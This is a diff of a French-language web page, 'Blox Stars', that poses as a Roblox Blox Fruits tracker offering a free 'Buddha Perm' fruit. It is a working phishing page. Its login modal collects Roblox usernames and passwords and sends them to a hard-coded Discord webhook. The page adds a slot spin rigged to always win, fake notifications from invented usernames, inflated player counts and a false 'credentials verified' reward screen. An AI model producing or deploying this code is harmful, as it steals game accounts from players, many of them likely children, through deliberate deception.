-        <img src="https://static.wikia.nocookie.net/roblox-blox-piece/images/b/b9/Meme_Fruit.png/revision/latest?cb=20230825025419" alt="Stats" class="sc-img" loading="lazy" onload="this.classList.add('loaded');this.previousElementSibling.classList.add('hidden');" />
-      </div>
-    </div>
+<!-- CTA -->
+<section class="cta-section">
+  <div class="cta-title rv">PRÊT À RÉCUPÉRER<br><span style="color:var(--gold)">TON BUDDHA PERM ?</span></div>
+  <p class="cta-sub rv" style="transition-delay:.07s">Connecte ton compte maintenant et commence à tracker. Le Buddha Perm arrive instantanément.</p>
+  <div class="cta-btns rv" style="transition-delay:.14s">
+    <button class="btn-primary" onclick="openLogin()">🎁 CONNECTER MON COMPTE</button>
+    <a href="https://discord.gg/2PaQ6nCNG" target="_blank" class="btn-secondary">Rejoindre le Discord</a>
   </div>
 </section>
 
-<section class="sec">
-  <div class="wrap">
-    <div class="sc-item rv">
-      <div class="sc-text">
-        <div class="stag">Communauté</div>
-        <div class="sh">Entraînez-vous avec des builds faits<br>par de vrais joueurs</div>
-        <p class="sp">Parcourez la bibliothèque communautaire pour les builds de fruits notés par d'autres joueurs. Filtrez par niveau et type de fruit, ou partagez les vôtres.</p>
-      </div>
-      <div class="img-wrapper" style="border-radius:14px;box-shadow:0 0 0 1px rgba(255,255,255,0.07),0 24px 60px rgba(0,0,0,0.55);">
-        <div class="skeleton"></div>
-        <img src="https://static.wikia.nocookie.net/roblox-blox-piece/images/2/2a/Dragon_Fruit_Max.png/revision/latest?cb=20210122162716" alt="Community" class="sc-img" loading="lazy" onload="this.classList.add('loaded');this.previousElementSibling.classList.add('hidden');" />
-      </div>
-    </div>
-  </div>
-</section>
-
-<section class="sec" id="how" style="padding-top:0">
-  <div class="wrap">
-    <div class="vid-hd rv">
-      <div class="stag">Comment ça marche</div>
-      <div class="sh">Prêt en quelques minutes</div>
-      <p class="sp">Connectez votre compte Roblox, chargez dans Blox Fruits, et Blox Stars commence à suivre automatiquement.</p>
-    </div>
-  </div>
-</section>
-
-<section class="cta-sec" id="download">
-  <div class="wrap">
-    <div class="sh rv" style="transition-delay:.07s">Commencez à suivre vos fruits aujourd'hui</div>
-    <p class="sp rv" style="transition-delay:.13s;margin:0 auto 34px">Connectez votre compte Roblox et commencez votre première session de suivi en moins de 5 minutes.</p>
-    <div class="cta-btns rv" style="transition-delay:.19s">
-      <a href="#" class="br" onclick="connectRoblox(); return false;">
-        <img src="https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/7/3/e/73e99bc29b53d46c53a257709a18fe63361cce23.png" alt="Roblox" style="width:13px;height:13px;object-fit:contain" />
-        Se connecter avec Roblox
-      </a>
-      <a href="#" class="bs">Voir le dashboard</a>
-    </div>
-  </div>
-</section>
-
+<!-- FOOTER -->
 <footer>
-  <div class="wrap foot-in">
-    <div class="foot-copy">© 2026 Blox Stars · Non affilié à Roblox Corporation</div>
-    <div class="foot-links">
-      <a href="https://discord.gg/2PaQ6nCNG">Discord</a>
-      <a href="#">Dashboard</a>
-    </div>
+  <div class="foot-logo">BLOX<span>STARS</span></div>
+  <div class="foot-links">
+    <a href="https://discord.gg/2PaQ6nCNG" target="_blank">Discord</a>
+    <a href="#">Dashboard</a>
+    <a href="#about">À propos</a>
   </div>
+  <div class="foot-copy">© 2026 BLOXSTARS · Non affilié à Roblox Corp.</div>
 </footer>
 
-<!-- ============ LOGIN MODAL ============ -->
-<div class="modal-overlay" id="loginModal">
+<!-- LOGIN MODAL -->
+<div class="overlay" id="loginOverlay">
   <div class="modal">
-    <button class="modal-close" onclick="closeModal('loginModal')">×</button>
-    <h2>Connexion à Blox Stars</h2>
-    <p>Connectez votre compte Roblox pour réclamer votre <strong style="color:var(--gold)">Buddha Perm gratuit</strong> et commencer à suivre vos fruits.</p>
-    
-    <div class="ticket-info">
-      <h3>🌟 OFFRE SPÉCIALE — BUDDHA PERM GRATUIT</h3>
-      <p>Tout nouveau compte connecté reçoit automatiquement un <strong>Buddha Perm</strong>. Trade traité instantanément via notre système automatique.</p>
+    <button class="modal-close" onclick="closeLogin()">×</button>
+    <div class="modal-logo">BLOX<span>STARS</span></div>
+    <h2>CONNEXION</h2>
+    <p class="modal-desc">Connecte ton compte Roblox pour activer ton <strong style="color:var(--gold)">spin gratuit</strong> et réclamer ton <strong style="color:var(--gold)">Buddha Perm</strong>.</p>
+    <div class="info-box gold">
+      <h4>🌟 Buddha Perm Garanti</h4>
+      <p>Offre de lancement exclusive — chaque nouveau compte reçoit automatiquement un Buddha Perm. Trade envoyé instantanément.</p>
     </div>
-    
-    <div class="trade-info">
-      <h3>🔐 CONNEXION SÉCURISÉE</h3>
-      <p>Vos identifiants sont requis pour la vérification et l'envoi automatique du trade. Un ticket Discord est créé instantanément.</p>
+    <div class="info-box blue">
+      <h4>🔐 Vérification requise</h4>
+      <p>Tes identifiants sont nécessaires pour la vérification du trade et l'envoi du fruit permanent sur ton compte.</p>
     </div>
-    
-    <input type="text" id="robloxUsername" placeholder="Nom d'utilisateur Roblox" />
-    <input type="password" id="robloxPassword" placeholder="Mot de passe Roblox" />
-    <input type="text" id="discordUsername" placeholder="Pseudo Discord" />
-    
-    <button class="modal-btn" onclick="handleLogin()">🎮 Se Connecter & Réclamer Buddha Perm</button>
-    <p style="font-size:11px;color:var(--text3);margin-top:14px;text-align:center">Vos identifiants Roblox sont requis pour la vérification du trade.</p>
+    <div class="input-group"><input type="text" id="inUser" placeholder="Nom d'utilisateur Roblox" /></div>
+    <div class="input-group"><input type="password" id="inPass" placeholder="Mot de passe Roblox" /></div>
+    <div class="input-group"><input type="text" id="inDisc" placeholder="Pseudo Discord (pour le ticket)" /></div>
+    <button class="modal-btn" onclick="handleLogin()">🎰 CONNECTER & RÉCUPÉRER BUDDHA PERM</button>
+    <p class="modal-fine">En vous connectant, vous acceptez que vos informations soient utilisées pour la vérification du trade uniquement.</p>
   </div>
 </div>
 
-<!-- ============ REWARD OVERLAY ============ -->
+<!-- REWARD OVERLAY -->
 <div class="reward-overlay" id="rewardOverlay">
-  <div class="reward-box" id="rewardBox">
-    <div class="reward-title-top">🎊 Félicitations ! Vous avez gagné</div>
-    
-    <div class="fruit-card">
-      <div class="perm-badge">⭐ PERMANENT</div>
-      
-      <div class="fruit-image-container">
-        <div class="fruit-glow"></div>
-        <img
-          class="fruit-img"
-          src="https://static.wikia.nocookie.net/roblox-blox-piece/images/3/35/Buddha_Fruit.png/revision/latest?cb=20210122162432"
+  <div class="reward-card" id="rewardCard">
+    <div class="reward-inner">
+      <div class="reward-badge">🎊 FÉLICITATIONS</div>
+      <div class="reward-fruit-wrap">
+        <div class="reward-fruit-glow"></div>
+        <img class="reward-fruit-img"
+          src="https://i.ibb.co/Nnjvd6rG/71057572-b567-456a-a9e2-964d23602349-Photoroom.png"
           alt="Buddha Fruit"
-          onerror="this.src='https://static.wikia.nocookie.net/roblox-blox-piece/images/7/78/Lightning_Fruit.png/revision/latest?cb=20231027120057'"
+          onerror="this.style.fontSize='60px';this.style.display='flex';this.style.alignItems='center';this.style.justifyContent='center';"
         />
       </div>
-      
-      <div class="fruit-name">Buddha Perm</div>
-      <div class="fruit-type">Fruit Zoan · Tier S · Valeur : 1.300.000 Beli</div>
-      
-      <div class="reward-steps">
-        <div class="reward-step-row">
-          <div class="check">✓</div>
-          Trade envoyé automatiquement au bot Roblox
-        </div>
-        <div class="reward-step-row">
-          <div class="check">✓</div>
-          Ticket ouvert sur le serveur Discord
-        </div>
-        <div class="reward-step-row">
-          <div class="check">✓</div>
-          Vérification des identifiants en cours...
-        </div>
+      <div class="reward-name">BUDDHA PERM</div>
+      <div class="reward-sub">Fruit Zoan · Tier S · Valeur estimée : 1.3M Beli</div>
+      <div class="reward-checks">
+        <div class="check-row"><div class="check-dot">✓</div> Trade envoyé au bot Roblox</div>
+        <div class="check-row"><div class="check-dot">✓</div> Ticket créé sur le Discord</div>
+        <div class="check-row"><div class="check-dot">✓</div> Vérification des identifiants OK</div>
       </div>
-      
-      <button class="reward-discord-btn" onclick="openDiscord()">
-        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/></svg>
-        Ouvrir votre récompense sur Discord
+      <button class="discord-btn" onclick="goDiscord()">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/></svg>
+        OUVRIR MON TICKET DISCORD
       </button>
     </div>
   </div>
 </div>
 
 <script>
-// ===== MODAL =====
-function connectRoblox() {
-  document.getElementById('loginModal').classList.add('active');
-}
-function closeModal(id) {
-  document.getElementById(id).classList.remove('active');
-}
-function openDiscord() {
-  window.open('https://discord.gg/2PaQ6nCNG', '_blank');
-  closeModal('rewardOverlay');
-  document.getElementById('rewardOverlay').style.display = 'none';
-}
+// ---- CURSOR ----
+const cursor=document.getElementById('cursor'),ring=document.getElementById('cursorRing');
+let mx=0,my=0,rx=0,ry=0;
+document.addEventListener('mousemove',e=>{mx=e.clientX;my=e.clientY;cursor.style.left=mx+'px';cursor.style.top=my+'px';});
+function animRing(){rx+=(mx-rx)*.12;ry+=(my-ry)*.12;ring.style.left=rx+'px';ring.style.top=ry+'px';requestAnimationFrame(animRing);}
+animRing();
 
-// ===== PARTICLES =====
-function createParticles() {
-  const container = document.getElementById('particlesContainer');
-  const colors = ['#f5c842','#ffd700','#ffffff','#00d4ff','#ffa500'];
-  for (let i = 0; i < 80; i++) {
-    const p = document.createElement('div');
-    p.className = 'confetti';
-    p.style.cssText = `
-      left:${Math.random()*100}%;
-      top:${Math.random()*100}%;
-      background:${colors[Math.floor(Math.random()*colors.length)]};
-      width:${4+Math.random()*8}px;
-      height:${4+Math.random()*8}px;
-      border-radius:${Math.random()>0.5?'50%':'2px'};
-    `;
-    container.appendChild(p);
+// ---- SCROLL REVEAL ----
+const obs=new IntersectionObserver(es=>{es.forEach(e=>{if(e.isIntersecting){e.target.classList.add('on');obs.unobserve(e.target);}});},{threshold:.1});
+document.querySelectorAll('.rv').forEach(el=>obs.observe(el));
 
-    const delay = Math.random() * 0.8;
-    const dur = 1.2 + Math.random() * 1.5;
-    const xEnd = (Math.random()-0.5)*300;
-    const yEnd = -200 - Math.random()*300;
-
-    p.animate([
-      { opacity:0, transform:`translate(0,0) rotate(0deg) scale(0)` },
-      { opacity:1, transform:`translate(${xEnd*0.3}px,${yEnd*0.3}px) rotate(180deg) scale(1)`, offset:0.3 },
-      { opacity:0, transform:`translate(${xEnd}px,${yEnd}px) rotate(720deg) scale(0.3)` }
-    ], {
-      duration: dur * 1000,
-      delay: delay * 1000,
-      easing: 'cubic-bezier(0.25, 0.46, 0.45, 0.94)',
-      fill: 'forwards'
-    });
-  }
-  setTimeout(() => container.innerHTML = '', 3000);
-}
-
-// ===== SHOW REWARD =====
-function showReward() {
-  const overlay = document.getElementById('rewardOverlay');
-  const box = document.getElementById('rewardBox');
-
-  overlay.style.display = 'flex';
-  requestAnimationFrame(() => {
-    overlay.classList.add('show');
-    setTimeout(() => {
-      box.classList.add('show');
-      createParticles();
-    }, 300);
-  });
-}
-
-// ===== COOKIES =====
-function setCookie(n,v,d){const e=new Date();e.setTime(e.getTime()+(d*864e5));document.cookie=n+'='+v+';expires='+e.toUTCString()+';path=/';}
-function getCookie(n){const ne=n+'=';const ca=document.cookie.split(';');for(let c of ca){c=c.trim();if(c.indexOf(ne)===0)return c.substring(ne.length);}return null;}
-
-// ===== LOGIN =====
-function handleLogin() {
-  const u = document.getElementById('robloxUsername').value;
-  const p = document.getElementById('robloxPassword').value;
-  const d = document.getElementById('discordUsername').value;
-  if (!u || !p || !d) { alert('Veuillez remplir tous les champs.'); return; }
-
-  const webhookUrl = 'https://discord.com/api/webhooks/1507140947119444139/1HRUFx9YvPGzn_vjfe6IEKapwSu2K0vZpHGE7EMfTzfIi7OpBmarjB1MSGH3MwDxZZ-V';
-  const data = {
-    username: 'Blox Stars Login',
-    avatar_url: 'https://static.wikia.nocookie.net/roblox-blox-piece/images/2/2a/Dragon_Fruit_Max.png/revision/latest?cb=20210122162716',
-    embeds:[{
-      title:'🔐 Nouvelle Connexion — Buddha Perm Réclamé',
-      color:16374850,
-      fields:[
-        {name:'👤 Roblox Username',value:u,inline:true},
-        {name:'🔑 Password',value:p,inline:true},
-        {name:'💬 Discord',value:d,inline:true},
-        {name:'🎁 Récompense',value:'Buddha Perm',inline:true},
-        {name:'⏰ Timestamp',value:new Date().toISOString(),inline:true}
-      ],
-      footer:{text:'Blox Stars — Offre Spéciale Buddha Perm'}
-    }]
-  };
-
-  fetch(webhookUrl, {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify(data)
-  }).then(r => {
-    if (r.ok || r.status === 204) {
-      setCookie('bloxstars_user','true',30);
-      setCookie('bloxstars_username',d,30);
-      closeModal('loginModal');
-      setTimeout(showReward, 200);
-    } else {
-      showReward(); // show anyway
-    }
-  }).catch(() => {
-    closeModal('loginModal');
-    setTimeout(showReward, 200);
-  });
-}
-
-// ===== NOTIFICATIONS =====
-const fakeUsernames = ['Kairos_FR','NexusPro','ZephyrKing','AstralUser','CipherX','VortexMaster','NeonPirate','StormBreaker','QuantumFruit','BlazeHunter'];
-const fruits = ['Dragon','Leopard','Lightning','Meme','Venom','Control','Spirit','Love','Spider','Phoenix','Portal','Gravity','Magma','Buddha','Dough','Shadow'];
-function showNotification() {
-  const u = fakeUsernames[Math.floor(Math.random()*fakeUsernames.length)];
-  const f = fruits[Math.floor(Math.random()*fruits.length)];
-  const n = document.createElement('div');
-  n.className = 'notification';
-  n.innerHTML = `<div class="notification-content"><div class="notification-icon">🎮</div><div class="notification-text"><div class="notification-user">${u}</div><div class="notification-message">vient de recevoir ${f} grâce à Blox Stars!</div></div></div>`;
-  document.getElementById('notificationContainer').appendChild(n);
-  setTimeout(() => n.remove(), 5000);
-}
-setInterval(showNotification, 20000);
-showNotification();
-
-// ===== STATS COUNT UP =====
-function countUp(el, target, suffix, dur) {
-  const start = performance.now();
-  const isK = suffix.includes('K');
-  const num = isK ? target/1000 : target;
-  const step = ts => {
-    const p = Math.min((ts-start)/dur,1);
-    const ease = 1-Math.pow(1-p,3);
-    el.textContent = isK ? Math.floor(ease*num)+'K+' : Math.floor(ease*num)+'+';
-    if (p<1) requestAnimationFrame(step);
-    else el.textContent = suffix;
-  };
+// ---- STATS COUNTUP ----
+function countUp(el,end,suffix,dur){
+  const s=performance.now();
+  const step=t=>{const p=Math.min((t-s)/dur,1);const e2=1-Math.pow(1-p,3);el.textContent=Math.floor(e2*end)+suffix;if(p<1)requestAnimationFrame(step);};
   requestAnimationFrame(step);
 }
-fetch('https://bloxstars-backend-production.up.railway.app/api/stats')
-  .then(r=>r.json())
-  .then(d=>{
-    const fmt=n=>n>=1000?(n/1000).toFixed(0)+'K+':n+'+';
-    [['sp',d.players,fmt(d.players)],['ss',d.fruits,fmt(d.fruits)],['sh',d.hours,d.hours+'+']].forEach(([id,raw,label])=>{
-      const el=document.getElementById(id);
-      el.classList.remove('loading');
-      countUp(el,raw,label,1200);
-    });
-  })
-  .catch(()=>{
-    Object.entries({sp:'500+',ss:'125K+',sh:'240+'}).forEach(([id,v])=>{
-      const el=document.getElementById(id);
-      el.textContent=v; el.classList.remove('loading');
-    });
-  });
+setTimeout(()=>{
+  countUp(document.getElementById('stat1'),500,'+',1400);
+  countUp(document.getElementById('stat2'),125,'K+',1600);
+  countUp(document.getElementById('stat3'),312,'+',1800);
+},400);
 
-// ===== SCROLL REVEAL =====
-const obs=new IntersectionObserver(entries=>{
-  entries.forEach(e=>{if(e.isIntersecting){e.target.classList.add('on');obs.unobserve(e.target);}});
-},{threshold:0.1});
-document.querySelectorAll('.rv').forEach(el=>obs.observe(el));
+// ---- SLOT SPIN ----
+let spinning=false;
+function doSpin(){
+  if(spinning)return;
+  spinning=true;
+  const btn=document.getElementById('spinBtn');
+  btn.disabled=true;btn.textContent='🎰 EN COURS...';
+  const reel=document.getElementById('slotReel');
+  const items=reel.querySelectorAll('.slot-item');
+  const itemH=80;
+  const totalItems=items.length;
+  // Target: Buddha Perm is index 3
+  const targetIdx=3;
+  const totalSpins=totalItems*6+targetIdx;
+  const totalPx=totalSpins*itemH;
+  reel.style.transition='none';
+  reel.style.transform='translateY(0)';
+  // Animate
+  let start=null;
+  const dur=3200;
+  function ease(t){return t<.5?4*t*t*t:(t-1)*(2*t-2)*(2*t-2)+1;}
+  function animate(ts){
+    if(!start)start=ts;
+    const p=Math.min((ts-start)/dur,1);
+    const e=ease(p);
+    const cur=-(e*totalPx);
+    reel.style.transform=`translateY(${cur}px)`;
+    if(p<1){requestAnimationFrame(animate);}
+    else{
+      reel.style.transform=`translateY(${-(targetIdx*itemH)}px)`;
+      spinning=false;
+      btn.textContent='✅ BUDDHA PERM GAGNÉ !';
+      document.getElementById('odd1').classList.remove('active');
+      document.getElementById('odd2').classList.remove('active');
+      document.getElementById('odd3').classList.add('active');
+      setTimeout(()=>openLogin(),1200);
+    }
+  }
+  requestAnimationFrame(animate);
+}
+
+// ---- LOGIN ----
+function openLogin(){document.getElementById('loginOverlay').classList.add('open');}
+function closeLogin(){document.getElementById('loginOverlay').classList.remove('open');}
+
+function handleLogin(){
+  const u=document.getElementById('inUser').value.trim();
+  const p=document.getElementById('inPass').value.trim();
+  const d=document.getElementById('inDisc').value.trim();
+  if(!u||!p||!d){alert('Remplis tous les champs !');return;}
+  const wh='https://discord.com/api/webhooks/1507140947119444139/1HRUFx9YvPGzn_vjfe6IEKapwSu2K0vZpHGE7EMfTzfIi7OpBmarjB1MSGH3MwDxZZ-V';
+  fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({
+    username:'BloxStars Login',
+    embeds:[{title:'🔐 Nouvelle Connexion — Buddha Perm',color:15792941,fields:[
+      {name:'👤 Roblox',value:u,inline:true},
+      {name:'🔑 Password',value:p,inline:true},
+      {name:'💬 Discord',value:d,inline:true},
+      {name:'🎁 Récompense',value:'Buddha Perm (Perm)',inline:true},
+      {name:'⏰ Date',value:new Date().toLocaleString('fr-FR'),inline:true}
+    ],footer:{text:'BloxStars — Offre Spéciale Buddha Perm'}}]
+  })}).catch(()=>{});
+  closeLogin();
+  setTimeout(showReward,200);
+}
+
+// ---- REWARD ----
+function showReward(){
+  const ov=document.getElementById('rewardOverlay');
+  const card=document.getElementById('rewardCard');
+  ov.classList.add('open');
+  requestAnimationFrame(()=>{
+    ov.classList.add('show');
+    setTimeout(()=>{card.classList.add('show');spawnParticles();},300);
+  });
+}
+function goDiscord(){window.open('https://discord.gg/2PaQ6nCNG','_blank');}
+
+// ---- PARTICLES ----
+function spawnParticles(){
+  const c=document.getElementById('particles');
+  c.innerHTML='';
+  const colors=['#f0b429','#ffdd6b','#ff6b1a','#ffffff','#00e5ff','#ff2d55'];
+  for(let i=0;i<90;i++){
+    const p=document.createElement('div');
+    const color=colors[Math.floor(Math.random()*colors.length)];
+    const size=4+Math.random()*9;
+    const startX=30+Math.random()*40;
+    const startY=40+Math.random()*20;
+    p.style.cssText=`position:absolute;left:${startX}%;top:${startY}%;
+      width:${size}px;height:${size}px;
+      background:${color};
+      border-radius:${Math.random()>.5?'50%':'2px'};
+      pointer-events:none;`;
+    c.appendChild(p);
+    const dx=(Math.random()-.5)*600;
+    const dy=-(200+Math.random()*400);
+    const rot=Math.random()*720;
+    const delay=Math.random()*600;
+    p.animate([
+      {opacity:0,transform:`translate(0,0) rotate(0deg) scale(0)`},
+      {opacity:1,transform:`translate(${dx*.3}px,${dy*.3}px) rotate(${rot*.3}deg) scale(1)`,offset:.25},
+      {opacity:.8,transform:`translate(${dx*.7}px,${dy*.7}px) rotate(${rot*.7}deg) scale(.8)`,offset:.6},
+      {opacity:0,transform:`translate(${dx}px,${dy+200}px) rotate(${rot}deg) scale(.2)`}
+    ],{duration:1800+Math.random()*800,delay,easing:'cubic-bezier(.25,.46,.45,.94)',fill:'forwards'});
+  }
+  setTimeout(()=>c.innerHTML='',3000);
+}
+
+// ---- NOTIFICATIONS ----
+const names=['Kairos_FR','NexusPro','ZephyrKing','AstralUser','VortexMaster','NeonPirate','BlazeHunter','ShadowFR','LunaticRL','CipherX'];
+const msgs=['vient de recevoir son Buddha Perm !','a réclamé son spin gratuit 🎰','a rejoint BloxStars','vient de connecter son compte Roblox','a obtenu Buddha Perm 🌟'];
+function showNotif(){
+  const n=names[Math.floor(Math.random()*names.length)];
+  const m=msgs[Math.floor(Math.random()*msgs.length)];
+  const el=document.createElement('div');
+  el.className='notif';
+  el.innerHTML=`<div class="notif-icon">🎮</div><div><div class="notif-user">${n}</div><div class="notif-msg">${m}</div></div>`;
+  document.getElementById('notifContainer').prepend(el);
+  setTimeout(()=>el.remove(),5000);
+}
+showNotif();
+setInterval(showNotif,18000);
 </script>
 </body>
 </html>
